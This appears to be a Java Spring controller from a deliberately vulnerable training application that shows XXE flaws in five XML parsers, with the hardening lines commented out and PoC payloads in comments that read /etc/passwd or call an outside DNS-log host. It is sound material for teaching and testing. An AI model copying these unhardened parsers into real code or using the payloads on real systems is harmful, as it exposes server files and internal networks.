package com.best.hello.controller.XXE;

import org.jdom2.input.SAXBuilder;
import org.dom4j.io.SAXReader;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;
import org.xmlbeam.annotation.XBRead;

import javax.xml.bind.JAXBContext;
import javax.xml.bind.Unmarshaller;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;
import java.io.*;


@RestController
@RequestMapping("/XXE")
public class XXE {

    /**
     * @vul XMLReader
     * @poc http://127.0.0.1:8888/XXE/XMLReader （POC）
     * Content-Type: application/xml
     * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://0g5zvd.dnslog.cn">]><root>&xxe;</root>
     */
    @RequestMapping(value = "/XMLReader", method = RequestMethod.POST)
    public String XMLReader(@RequestBody String content) {
        try {
            System.out.println(content);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // 修复：禁用外部实体
            // xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.parse(new InputSource(new StringReader(content)));
            return "XMLReader XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }

    /**
     * @vul xmlbeam
     */
    @RequestMapping(value = "/xmlbeam", method = RequestMethod.POST)
    public String handleCustomer(@RequestBody Customer customer) {
        System.out.println(customer);
        return String.format("%s:%s login success!", customer.getFirstname(), customer.getLastname());

    }

    public interface Customer {
        @XBRead("//username")
        String getFirstname();

        @XBRead("//password")
        String getLastname();
    }


    /**
     * @vul SAXReader
     */
    @RequestMapping(value = "/SAXReader", method = RequestMethod.POST)
    public String SAXReader(@RequestBody String content) {
        try {
            SAXReader sax = new SAXReader();
            // 修复：禁用外部实体
            // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            sax.read(new InputSource(new StringReader(content)));
            return "SAXReader XXE";
        } catch (Exception e) {
            return e.toString();
        }

    }

    /**
     * @vul SAXBuilder，是一个JDOM解析器，能将路径中的XML文件解析为Document对象
     */
    @RequestMapping(value = "/SAXBuilder", method = RequestMethod.POST)
    public String SAXBuilder(@RequestBody String content) {
        try {
            SAXBuilder saxbuilder = new SAXBuilder();
            // saxbuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            saxbuilder.build(new InputSource(new StringReader(content)));
            return "SAXBuilder XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }


    /**
     * @vul DocumentBuilder类 有回显
     * @poc http://god.com:8888/XXE/DocumentBuilder
     * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><person><name>&xxe;</name></person>
     */
    @RequestMapping(value = "/DocumentBuilder", method = RequestMethod.POST)
    public String DocumentBuilder(@RequestBody String content) {
        try {
            // DocumentBuilderFactory是用于创建DOM模式的解析器对象,newInstance方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            // dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            DocumentBuilder builder = factory.newDocumentBuilder();
            StringReader sr = new StringReader(content);
            InputSource is = new InputSource(sr);
            Document document = builder.parse(is);

            // 获取<person>标签名
            NodeList nodeList = document.getElementsByTagName("person");
            Element element = (Element) nodeList.item(0);
            return String.format("姓名: %s", element.getElementsByTagName("name").item(0).getFirstChild().getNodeValue());

        } catch (Exception e) {
            return e.toString();
        }
    }


    /**
     * @vul Unmarshaller
     * @poc http://127.0.0.1:8888/XXE/unmarshaller (POST)
     * payload <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/passwd">]><student><name>&out;</name></student>
     */
    @RequestMapping(value = "/unmarshaller", method = RequestMethod.POST)
    public String Unmarshaller(@RequestBody String content) {
        try {

            JAXBContext context = JAXBContext.newInstance(Student.class);
            Unmarshaller unmarshaller = context.createUnmarshaller();

            XMLInputFactory xif = XMLInputFactory.newFactory();
            // fixed: 禁用外部实体
            // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

            // 默认情况下在1.8版本上不能加载外部dtd文件，需要更改设置。
            // xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, true);
            // xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
            XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(content));

            Object o = unmarshaller.unmarshal(xsr);
            return o.toString();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return "出错了！";
    }


}
